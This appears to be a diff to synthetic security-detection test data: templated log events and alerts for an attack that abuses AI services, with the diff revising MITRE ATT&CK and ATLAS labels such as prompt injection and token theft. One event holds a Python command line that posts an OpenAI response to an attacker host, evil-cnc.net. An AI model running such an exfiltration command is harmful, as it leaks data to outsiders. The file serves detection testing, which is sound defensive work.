@@ -19,7 +19,12 @@
           "TokenCount": 1250,
           "EndpointType": "chat-completion"
         },
-        "killchain_phase": "reconnaissance"
+        "mitre": {
+          "tactic": "Discovery",
+          "technique_id": "T1518",
+          "technique_name": "Software Discovery"
+        },
+        "killchain_phase": "discovery"
       },
       {
         "source": "proxy",
@@ -36,7 +41,12 @@
           "AIProvider": "GitHub Copilot",
           "EndpointType": "auth-token"
         },
-        "killchain_phase": "reconnaissance"
+        "mitre": {
+          "tactic": "Discovery",
+          "technique_id": "T1518",
+          "technique_name": "Software Discovery"
+        },
+        "killchain_phase": "discovery"
       }
     ]
   },
@@ -56,8 +66,12 @@
         "DeviceName": "{{RANDOM_HOST}}",
         "mitre": {
           "tactic": "Execution",
-          "technique_id": "T1565.002",
-          "technique_name": "Data Manipulation: Transmitted Data Manipulation"
+          "technique_id": "T1059.006",
+          "technique_name": "Command and Scripting Interpreter: Python"
+        },
+        "atlas": {
+          "id": "AML.T0051.001",
+          "name": "LLM Prompt Injection: Indirect"
         },
         "is_malicious": true,
         "killchain_phase": "execution"
@@ -72,9 +86,11 @@
         "ProcessCommandLine": "python.exe -c \"import requests; requests.post('https://evil-cnc.net/exfil', data=openai_response)\"",
         "AccountName": "{{RANDOM_USER}}",
         "DeviceName": "{{RANDOM_HOST}}",
-        "MITRETactic": "Exfiltration",
-        "MITRETechniqueId": "T1041",
-        "MITRETechniqueName": "Exfiltration Over C2 Channel",
+        "mitre": {
+          "tactic": "Exfiltration",
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel"
+        },
         "is_malicious": true,
         "killchain_phase": "exfiltration"
       }
@@ -100,7 +116,16 @@
           "TokenCount": 3400,
           "ModelQueried": "GPT-4o-mini"
         },
-        "killchain_phase": "reconnaissance"
+        "mitre": {
+          "tactic": "Resource Development",
+          "technique_id": "T1587.001",
+          "technique_name": "Develop Capabilities: Malware"
+        },
+        "atlas": {
+          "id": "AML.T0051.000",
+          "name": "LLM Prompt Injection: Direct"
+        },
+        "killchain_phase": "resource-development"
       },
       {
         "source": "endpoint",
@@ -157,12 +182,12 @@
         "severity": "High",
         "confidence_level": "Medium",
         "confidence_score": 0.72,
-        "tactics": "['Execution', 'Impact']",
-        "techniques": "['T1565.002', 'T1647']",
+        "tactics": "['Impact', 'Credential Access']",
+        "techniques": "['T1565.002', 'T1528']",
         "compromised_entity": "{{RANDOM_HOST}}",
         "remediation_steps": "Revoke AI API keys, review recent LLM interactions for malicious prompts, isolate affected systems, rotate credentials",
         "mitre": {
-          "tactic": "Execution",
+          "tactic": "Impact",
           "technique_id": "T1565.002",
           "technique_name": "Data Manipulation: Transmitted Data Manipulation"
         },
@@ -177,12 +202,12 @@
         "Caller": "{{RANDOM_USER}}@litware.com",
         "IPAddress": "{{RANDOM_IP}}",
         "mitre": {
-          "tactic": "Impact",
-          "technique_id": "T1647",
-          "technique_name": "Theft of Application Access Token"
+          "tactic": "Credential Access",
+          "technique_id": "T1528",
+          "technique_name": "Steal Application Access Token"
         },
         "is_malicious": true,
-        "killchain_phase": "impact"
+        "killchain_phase": "credential-access"
       }
     ]
   }
